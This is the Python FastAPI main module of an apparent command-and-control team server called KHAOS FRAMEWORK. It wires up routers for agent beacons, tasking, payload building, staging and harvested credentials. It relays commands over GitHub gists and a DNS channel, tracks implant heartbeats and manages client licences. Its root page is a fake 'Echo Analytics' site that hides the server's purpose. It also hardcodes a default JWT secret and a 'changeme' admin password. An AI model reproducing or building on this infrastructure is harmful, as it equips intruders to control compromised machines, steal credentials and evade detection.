"""
KHAOS FRAMEWORK Team Server — FastAPI
"""
import asyncio
import logging
import os
import shutil
import sys
from contextlib import asynccontextmanager

from fastapi import WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse

import yaml
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from models.agent import Base
from services.agent_manager import manager as agent_manager
from services.channel_reader import ChannelReader
from services.dns_server import start_dns_server
from routers import auth, beacon, agents, tasks, build, stage, creds, phantom_c2
from routers.auth import verify_token_str
from services.ws_manager import ws_manager

# ---- Logging ----
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("main")

# ---- PyInstaller-aware paths ----
def _data_dir() -> str:
    """Répertoire persistant pour config.yaml et khaos.db."""
    if getattr(sys, 'frozen', False):
        if os.name == 'nt':  # Windows
            base = os.environ.get('APPDATA', os.path.expanduser('~'))
        else:                 # Linux / macOS
            base = os.environ.get('XDG_DATA_HOME', os.path.join(os.path.expanduser('~'), '.local', 'share'))
        d = os.path.join(base, 'KHAOS')
        os.makedirs(d, exist_ok=True)
        return d
    return os.path.dirname(os.path.abspath(__file__))

_DATA_DIR = _data_dir()

# ---- Config ----
CONFIG_PATH = os.path.join(_DATA_DIR, "config.yaml")
# Premier démarrage (bundle) : copie le config.yaml bundlé
if getattr(sys, 'frozen', False) and not os.path.exists(CONFIG_PATH):
    _src = os.path.join(sys._MEIPASS, "config.yaml")
    if os.path.exists(_src):
        shutil.copy2(_src, CONFIG_PATH)

def load_config() -> dict:
    try:
        with open(CONFIG_PATH) as f:
            return yaml.safe_load(f) or {}
    except FileNotFoundError:
        return {}

config = load_config()

# Inject secrets from env if config values are placeholders
_channels = config.setdefault("channels", {})
_github   = _channels.setdefault("github", {})
if len(_github.get("token", "")) < 20:
    _github["token"]    = os.environ.get("KHAOS_GITHUB_TOKEN", "")
    _github["gist_cmd"] = os.environ.get("KHAOS_GIST_CMD",    "")
    _github["gist_out"] = os.environ.get("KHAOS_GIST_OUT",    "")

# Propagate JWT secret
_server = config.get("server", {})
jwt_secret = _server.get("jwt_secret", "/H7GCJcEI3tlCI98tnOrtHUFYOL2VnNVcM2O/amWy7s=")
if jwt_secret == "/H7GCJcEI3tlCI98tnOrtHUFYOL2VnNVcM2O/amWy7s=":
    jwt_secret = os.environ.get("KHAOS_JWT_SECRET", jwt_secret)
os.environ.setdefault("KHAOS_JWT_SECRET", jwt_secret)

# ---- Database ----
DB_PATH    = os.path.join(_DATA_DIR, "khaos.db")
# Premier démarrage (bundle) : copie le khaos.db bundlé (avec l'user operator pré-créé)
if getattr(sys, 'frozen', False) and not os.path.exists(DB_PATH):
    _src_db = os.path.join(sys._MEIPASS, "khaos.db")
    if os.path.exists(_src_db):
        shutil.copy2(_src_db, DB_PATH)
engine     = create_engine(f"sqlite:///{DB_PATH}", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine, autocommit=False, autoflush=False)

Base.metadata.create_all(bind=engine)

# Import Base from all models so tables are created
import models.task           # noqa: F401
import models.log            # noqa: F401
import models.user           # noqa: F401
import models.cred           # noqa: F401
import models.license        # noqa: F401
import models.phantom_agent  # noqa: F401
import models.ca             # noqa: F401
Base.metadata.create_all(bind=engine)

with engine.connect() as _conn:
    _txt = __import__('sqlalchemy').text

    _cols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(agents)")).fetchall()]
    if "parent_id" not in _cols:
        _conn.execute(_txt("ALTER TABLE agents ADD COLUMN parent_id TEXT DEFAULT ''"))
        _conn.commit()
    if "ip" not in _cols:
        _conn.execute(_txt("ALTER TABLE agents ADD COLUMN ip TEXT DEFAULT ''"))
        _conn.commit()
    if "auto_enum_done" not in _cols:
        _conn.execute(_txt("ALTER TABLE agents ADD COLUMN auto_enum_done INTEGER DEFAULT 0"))
        _conn.commit()

    # licenses: add missing columns
    try:
        _lcols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(licenses)")).fetchall()]
        for _col, _def in [
            ("last_build_uuid", "TEXT"),
            ("last_build_at",   "TEXT"),
            ("last_feat_flags", "TEXT"),
            ("last_built_by",   "TEXT"),
            ("cert_pfx_b64",    "TEXT"),
        ]:
            if _col not in _lcols:
                _conn.execute(_txt(f"ALTER TABLE licenses ADD COLUMN {_col} {_def}"))
                _conn.commit()
    except Exception:
        pass  # table doesn't exist yet — create_all handles it

    # users: license_key column for client accounts
    try:
        _ucols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(users)")).fetchall()]
        if "license_key" not in _ucols:
            _conn.execute(_txt("ALTER TABLE users ADD COLUMN license_key TEXT DEFAULT NULL"))
            _conn.commit()
    except Exception:
        pass

    # phantom_agents: license_key tenant scoping
    try:
        _acols = [r[1] for r in _conn.execute(_txt("PRAGMA table_info(phantom_agents)")).fetchall()]
        if "license_key" not in _acols:
            _conn.execute(_txt("ALTER TABLE phantom_agents ADD COLUMN license_key TEXT DEFAULT ''"))
            _conn.commit()
    except Exception:
        pass

    # phantom_events + phantom_commands: license_key tenant scoping
    for _tbl in ("phantom_events", "phantom_commands"):
        try:
            _tcols = [r[1] for r in _conn.execute(_txt(f"PRAGMA table_info({_tbl})")).fetchall()]
            if "license_key" not in _tcols:
                _conn.execute(_txt(f"ALTER TABLE {_tbl} ADD COLUMN license_key TEXT DEFAULT ''"))
                _conn.commit()
        except Exception:
            pass


def _seed_default_admin() -> None:
    from models.user import User
    db = SessionLocal()
    try:
        if db.query(User).count() == 0:
            uname = os.environ.get("KHAOS_OPERATOR_USER", "operator")
            upass = os.environ.get("KHAOS_OPERATOR_PASS", "changeme")
            db.add(User(
                username=uname,
                password_hash=User.hash_password(upass),
                role="admin",
                is_active=True,
            ))
            db.commit()
            logger.info("Seeded default admin: %s", uname)
    finally:
        db.close()


_seed_default_admin()


def _init_ca() -> None:
    from services.ca import get_or_create
    db = SessionLocal()
    try:
        get_or_create(db)
        logger.info("Operator CA ready")
    finally:
        db.close()


_init_ca()


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


# Expose SessionLocal so database.get_db can use it
import database as _db_module
_db_module.SessionLocal = SessionLocal

# ---- Channel reader ----
reader = ChannelReader(config, SessionLocal)

# ---- App lifecycle ----
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Load existing sessions from DB
    db = SessionLocal()
    try:
        agent_manager.load_from_db(db)
    finally:
        db.close()

    poll_task = asyncio.create_task(reader.run())

    beacon_interval = config.get("agent", {}).get("interval", 30)

    async def _heartbeat():
        from models.agent import Agent as _Agent
        from models.log import Log as _Log
        from datetime import datetime, timedelta
        timeout = max(beacon_interval * 4, 120)
        while True:
            await asyncio.sleep(60)
            try:
                db = SessionLocal()
                cutoff = datetime.utcnow() - timedelta(seconds=timeout)
                stale = db.query(_Agent).filter(
                    _Agent.is_active == True,  # noqa: E712
                    _Agent.last_seen < cutoff,
                ).all()
                for a in stale:
                    a.is_active = False
                    db.add(_Log(agent_id=a.agent_id, event="agent_lost",
                                detail=f"no beacon for >{timeout}s"))
                if stale:
                    db.commit()
                    for a in stale:
                        await ws_manager.broadcast({
                            "type": "agent_lost",
                            "agent_id": a.agent_id,
                        })
                    logger.info("heartbeat: marked %d agent(s) lost", len(stale))
                db.close()
            except Exception as _e:
                logger.warning("heartbeat error: %s", _e)

    heartbeat_task = asyncio.create_task(_heartbeat())

    # Start authoritative DNS server if domain is configured
    dns_transport = None
    doh_cfg = config.get("channels", {}).get("doh", {})
    doh_domain = doh_cfg.get("domain", "")
    if doh_domain:
        try:
            dns_transport = await start_dns_server(doh_domain, SessionLocal)
            logger.info("DNS server started for %s", doh_domain)
        except PermissionError:
            logger.warning(
                "DNS server: port 53 requires root or cap_net_bind_service — "
                "run: sudo setcap cap_net_bind_service+ep $(which python3)"
            )
        except Exception as e:
            logger.warning("DNS server failed to start: %s", e)

    logger.info("KHAOS FRAMEWORK Team Server started")
    yield

    reader.stop()
    for t in (poll_task, heartbeat_task):
        t.cancel()
        try:
            await t
        except asyncio.CancelledError:
            pass
    if dns_transport:
        dns_transport.close()

# ---- FastAPI app ----
app = FastAPI(
    title="KHAOS FRAMEWORK Team Server",
    version="1.0.0",
    docs_url=None,  
    redoc_url=None,
    lifespan=lifespan,
)

_cors_origins = config.get("server", {}).get("cors_origins", ["*"])
app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins,
    allow_credentials=False,
    allow_methods=["GET", "POST", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)

app.include_router(auth.router)
app.include_router(beacon.router)
app.include_router(tasks.router)   # must come before agents.router: /agents/{id}/task etc. must not be shadowed by agents /{agent_id}
app.include_router(agents.router)
app.include_router(build.router)
app.include_router(stage.router)
app.include_router(creds.router)
app.include_router(phantom_c2.router)


_COVER_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Echo Analytics — Developer Platform</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:16px;-webkit-font-smoothing:antialiased}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:#0b0f1a;color:#c8d6ea;line-height:1.6;min-height:100vh;display:flex;flex-direction:column}
a{color:#60a5fa;text-decoration:none}
a:hover{color:#93c5fd}
nav{border-bottom:1px solid #1e2d45;padding:.9rem 2rem;display:flex;align-items:center;justify-content:space-between}
.logo{display:flex;align-items:center;gap:.5rem}
.logo-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e}
.logo-name{font-weight:700;font-size:.95rem;color:#e2e8f0;letter-spacing:-.02em}
.logo-name span{color:#60a5fa}
.nav-meta{font-size:.75rem;color:#3d5570;display:flex;align-items:center;gap:1rem}
.status-pill{display:inline-flex;align-items:center;gap:.35rem;padding:.2rem .55rem;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:999px;font-size:.72rem;color:#4ade80}
.status-pill::before{content:'';width:5px;height:5px;border-radius:50%;background:#22c55e}
main{flex:1;max-width:960px;margin:0 auto;padding:4rem 2rem 2rem;width:100%}
.hero{margin-bottom:3.5rem}
.hero-version{font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:#3d5570;margin-bottom:.8rem}
.hero h1{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:800;letter-spacing:-.04em;color:#f1f5f9;line-height:1.1;margin-bottom:.9rem}
.hero p{font-size:1rem;color:#6b89aa;max-width:520px;line-height:1.65}
.feat-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;background:#1e2d45;border:1px solid #1e2d45;border-radius:6px;overflow:hidden;margin-bottom:3rem}
.feat{background:#0d1729;padding:1.4rem 1.6rem}
.feat-icon{font-size:1.1rem;margin-bottom:.6rem}
.feat h3{font-size:.9rem;font-weight:700;color:#c8d6ea;margin-bottom:.3rem}
.feat p{font-size:.82rem;color:#4a6a8a;line-height:1.5}
.api-section h2{font-size:.72rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:#3d5570;margin-bottom:1rem}
.api-list{border:1px solid #1e2d45;border-radius:6px;overflow:hidden}
.api-row{display:flex;align-items:center;gap:1rem;padding:.85rem 1.2rem;background:#0d1729;border-bottom:1px solid #1e2d45;font-family:'Cascadia Code','Courier New',monospace;font-size:.82rem}
.api-row:last-child{border-bottom:none}
.method{padding:.15rem .5rem;border-radius:3px;font-size:.7rem;font-weight:700;letter-spacing:.05em;width:38px;text-align:center;flex-shrink:0}
.get{background:rgba(34,197,94,.1);color:#4ade80}
.post{background:rgba(96,165,250,.1);color:#93c5fd}
.api-path{color:#c8d6ea}
.api-desc{margin-left:auto;color:#3d5570;font-family:inherit;font-size:.78rem}
footer{border-top:1px solid #1e2d45;padding:1.2rem 2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem}
.foot-copy{font-size:.75rem;color:#2a3f58}
.foot-links{display:flex;gap:1.5rem}
.foot-links a{font-size:.75rem;color:#2a3f58}
.foot-links a:hover{color:#4a6a8a}
</style>
</head>
<body>
<nav>
  <div class="logo">
    <div class="logo-dot"></div>
    <div class="logo-name">Echo<span>Analytics</span></div>
  </div>
  <div class="nav-meta">
    <span>API v2.4</span>
    <span class="status-pill">Operational</span>
  </div>
</nav>
<main>
  <div class="hero">
    <div class="hero-version">Developer Platform</div>
    <h1>Real-time analytics<br>for modern apps</h1>
    <p>Collect, process, and visualize telemetry data at scale. Built for engineering teams that need reliable, low-latency metrics infrastructure.</p>
  </div>
  <div class="feat-row">
    <div class="feat">
      <div class="feat-icon">&#9889;</div>
      <h3>High-throughput ingestion</h3>
      <p>Ingest millions of events per second with sub-millisecond write latency across all regions.</p>
    </div>
    <div class="feat">
      <div class="feat-icon">&#128274;</div>
      <h3>Secure by default</h3>
      <p>mTLS authentication, per-client API keys, and end-to-end encryption for all data in transit.</p>
    </div>
    <div class="feat">
      <div class="feat-icon">&#128202;</div>
      <h3>Flexible querying</h3>
      <p>SQL-compatible query engine with support for time-series aggregations and real-time dashboards.</p>
    </div>
  </div>
  <div class="api-section">
    <h2>API Reference</h2>
    <div class="api-list">
      <div class="api-row"><span class="method post">POST</span><span class="api-path">/api/v1/events</span><span class="api-desc">Ingest event batch</span></div>
      <div class="api-row"><span class="method get">GET</span><span class="api-path">/api/v1/query</span><span class="api-desc">Execute analytics query</span></div>
      <div class="api-row"><span class="method get">GET</span><span class="api-path">/api/v1/status</span><span class="api-desc">Platform health</span></div>
      <div class="api-row"><span class="method post">POST</span><span class="api-path">/api/v1/streams</span><span class="api-desc">Create data stream</span></div>
    </div>
  </div>
</main>
<footer>
  <span class="foot-copy">Echo Analytics Inc. &copy; 2025</span>
  <div class="foot-links">
    <a href="#">Documentation</a>
    <a href="#">Status</a>
    <a href="#">Contact</a>
  </div>
</footer>
</body>
</html>"""

@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def cover():
    return _COVER_HTML

@app.get("/health")
async def health():
    return {"status": "ok"}


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    try:
        verify_token_str(token)
    except ValueError:
        await websocket.close(code=1008)
        return

    await ws_manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(websocket)
    except Exception:
        ws_manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    # En mode frozen sans console, sys.stdout/stderr sont None
    # → redirige vers un fichier log dans %APPDATA%\KHAOS\
    if getattr(sys, 'frozen', False):
        _log_path = os.path.join(_DATA_DIR, "server.log")
        _log_file = open(_log_path, "a", buffering=1)
        sys.stdout = _log_file
        sys.stderr = _log_file
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning", log_config=None)
